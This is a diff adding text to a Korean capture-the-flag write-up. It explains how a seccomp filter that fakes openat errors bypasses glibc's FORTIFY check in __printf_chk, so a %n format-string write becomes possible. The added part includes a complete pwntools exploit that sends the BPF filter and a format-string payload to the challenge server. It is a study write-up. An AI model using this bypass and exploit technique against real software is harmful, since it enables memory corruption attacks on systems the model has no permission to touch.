@@ -142,6 +142,9 @@ target을 0x1337로 변조하면 플래그를 출력해주지만, `printf_chk` �
 <br>
 
 
+`__readonly_area` 함수에서는 해당 포인터가 read-only 영역인지 확인한다. 하지만 fopen에 실패했을 경우 에러코드를 통해 해당 영역이 read-only 영역에 해당하는 지를 반환한다. 
+
+
 ```c
 int
 __readonly_area (const char *ptr, size_t size)
@@ -169,4 +172,75 @@ __readonly_area (const char *ptr, size_t size)
 
 
 {: file='sysdeps/unix/sysv/linux/readonly-area.c'}
+
+
+<br>
+
+
+seccomp를 통해 `openat` 시스템콜을 막고 원하는 에러코드를 반환하도록 설정할 수 있다.
+
+
+flag 파일을 읽어들일 때도 `openat` 시스템콜을 사용하므로 인자로 플래그 파일명 포인터가 넘어왔을 때는 허용해주었다.
+
+
+`openat` 함수는 rsi를 파일명 포인터로 받으므로 `A = args[1]`로 설정해주어야 한다.
+
+
+```ruby
+A = sys_number
+A != openat ? ok : next
+A = args[1]
+A == 0x402147 ? ok : next
+return ERRNO(2)
+ok:
+return ALLOW
+```
+
+
+<br>
+
+
+이제 `%n`을 사용할 수 있으므로 FSB를 통해 값을 변조하면 된다.
+
+
+## 익스플로잇
+
+
+---
+
+
+```python
+import requests
+import base64 
+from pwn import*
+
+send_payload:list[bytes] = []
+
+bpf = b"\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x04\x01\x01\x00\x00\x20\x00\x00\x00\x18\x00\x00\x00\x54\x00\x00\x00\xff\x00\x00\x00\x15\x00\x01\x00\x47\x00\x00\x00\x06\x00\x00\x00\x02\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f"
+send_payload.append(p32(len(bpf)))
+send_payload.append(bytes(bpf))
+
+
+payload = b''
+payload += b'%' + b'4856' + b'c' # 0x1337
+payload += b'%d%d%d%d%d%d%d%d%d%n'
+payload += b'A' * (8 - (len(payload) % 8))
+payload += p64(0x404088)
+send_payload.append(payload)
+
+result_payload = b''.join(send_payload)
+
+res = requests.post('http://15.164.245.40:1400/', data={'payload':base64.b64encode(result_payload)})
+
+print(res.text)
+```
+
+
+## 레퍼런스
+
+
+---
+
+
+[https://0xacb.com/2017/11/19/hxp-flag-store/](https://0xacb.com/2017/11/19/hxp-flag-store/)
 
